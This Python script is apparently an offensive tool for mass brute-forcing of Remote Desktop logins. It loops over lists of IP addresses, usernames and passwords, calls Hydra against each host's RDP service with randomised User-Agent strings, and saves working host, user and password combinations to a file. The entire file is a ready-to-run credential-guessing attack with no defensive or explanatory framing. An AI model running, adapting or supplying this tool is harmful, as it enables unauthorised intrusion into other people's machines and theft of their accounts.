#@Ya110Ya59
#naji
import sys
import subprocess
import os
import resource
import json
import random
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

def load_list_from_file(file_path):
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file.readlines()]
    except Exception as e:
        print(f"Error reading {file_path}: {e}")
        sys.exit()

def load_user_agents():
    try:
        with open('user_agents.json', 'r') as f:
            return json.load(f)
    except Exception as e:
        print(f"Error loading user agents: {e}")
        sys.exit()

def generate_user_agents():
    os_list = [
        "Windows NT 10.0; Win64; x64", "Windows NT 6.1; Win64; x64", "Macintosh; Intel Mac OS X 10_15_7",
        "X11; Linux x86_64", "Android 11; Mobile", "iPhone; CPU iPhone OS 14_6 like Mac OS X", "Linux; U; Android 9"
    ]
    browser_list = [
        "Chrome/91.0.4472.124", "Firefox/76.0", "Edge/91.0.864.59", "Safari/537.36", "Opera/76.0.4017.177",
        "Version/14.0 Mobile", "Gecko/20100101"
    ]
    device_list = ["Mobile", "Desktop", "Tablet", "iPhone", "Android", "Windows Phone"]
    user_agents = [
        f"Mozilla/5.0 ({os}) AppleWebKit/537.36 (KHTML, like Gecko) {browser} {device} Safari/537.36"
        for os in os_list for browser in browser_list for device in device_list
    ]
    with open("user_agents.json", "w") as f:
        json.dump(user_agents, f)

def run_hydra(host, user, password, user_agents, successful_hosts):
    if host in successful_hosts:
        return None
    user_agent = random.choice(user_agents)
    try:
        command = ["hydra", "-t", "313", "-l", user, "-p", password, "-m", f"User-Agent: {user_agent}", "rdp://" + host]
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=14)
        if "successfully completed" in result.stdout:
            print(f"✅ Correct password found! Host={host}, User={user}, Password={password}")
            successful_hosts.add(host)
            return (host, user, password)
    except subprocess.TimeoutExpired:
        print(f"⏰ Timeout: Host={host}, User={user}, Password={password}")
    except Exception as e:
        print(f"Error testing {host}: {e}")
    return None

def save_valid_combination(valid_combination):
    with open("combinat.txt", "a") as file:
        file.write(f"{valid_combination[0]}:{valid_combination[1]}:{valid_combination[2]}\n")

def limit_memory():
    soft, hard = resource.getrlimit(resource.RLIMIT_AS)
    max_memory = int((os.sysconf('SC_PAGE_SIZE') * os.sysconf('SC_PHYS_PAGES')) * 0.8)
    resource.setrlimit(resource.RLIMIT_AS, (max_memory, hard))

def throttle_cpu():
    while True:
        load_avg = os.getloadavg()[0] / os.cpu_count()
        if load_avg > 0.85:
            time.sleep(0.1)
        else:
            break

def generate_combinations(ip_list, user_list, password_list):
    for ip in ip_list:
        for user in user_list:
            for password in password_list:
                yield (ip, user, password)

def main():
    try:
        if not os.path.exists("user_agents.json"):
            print("Generating User-Agent list...")
            generate_user_agents()
        user_agents = load_user_agents()
        limit_memory()
        ip_list = load_list_from_file("ips.txt")
        user_list = load_list_from_file("users.txt")
        password_list = load_list_from_file("passwords.txt")
        combinations_generator = generate_combinations(ip_list, user_list, password_list)
        cpu_count = os.cpu_count() or 1
        max_workers = min(100, cpu_count * 10)
        successful_hosts = set()
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = []
            for ip, user, password in combinations_generator:
                throttle_cpu()
                futures.append(executor.submit(run_hydra, ip, user, password, user_agents, successful_hosts))
                if len(futures) >= max_workers * 2:
                    for future in as_completed(futures):
                        result = future.result()
                        if result:
                            save_valid_combination(result)
                            print(f"✅ Valid combination saved: Host={result[0]}, User={result[1]}, Password={result[2]}")
                    futures = []
            for future in as_completed(futures):
                result = future.result()
                if result:
                    save_valid_combination(result)
                    print(f"✅ Valid combination saved: Host={result[0]}, User={result[1]}, Password={result[2]}")
    except KeyboardInterrupt:
        print("\nProgram terminated by user...")
        sys.exit()

if __name__ == "__main__":
    main()
